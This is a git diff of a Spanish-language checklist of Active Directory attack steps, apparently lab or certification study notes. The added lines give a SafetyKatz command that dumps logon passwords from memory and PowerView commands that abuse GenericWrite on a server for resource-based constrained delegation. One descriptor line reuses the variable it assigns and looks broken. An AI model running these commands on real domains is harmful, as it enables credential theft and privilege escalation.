@@ -42,4 +42,13 @@
 - [ ] `Get-DomainGPO -ComputerIdentity tech-dc`
 
 ### Obtener credenciales
-- [ ] `SafetyKatz.exe "privilege::debug`
+- [ ] `SafetyKatz.exe "privilege::debug" "token::elevate" "sekurlsa::evasive-logonPasswords" "exit"`
+
+### MGMTSRV GenericWrite
+- [ ] Nueva Shell con *InviShell* y *PowerView*
+- [ ] `$sid = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"`
+- [ ] `$SD = New-Object byte[] ($sid.BinaryLength)`
+- [ ] `$sid.GetBinaryForm($SD, 0)`
+- [ ] `Set-DomainObject -Identity mgmtsrv -Set @{'msds-allowedtoactonbehalfofotheridentity' = $SD}`
+- [ ] `Get-DomainObject -Identity mgmtsrv -Properties 'msds-allowedtoactonbehalfofotheridentity'`
+### Obtener hash 
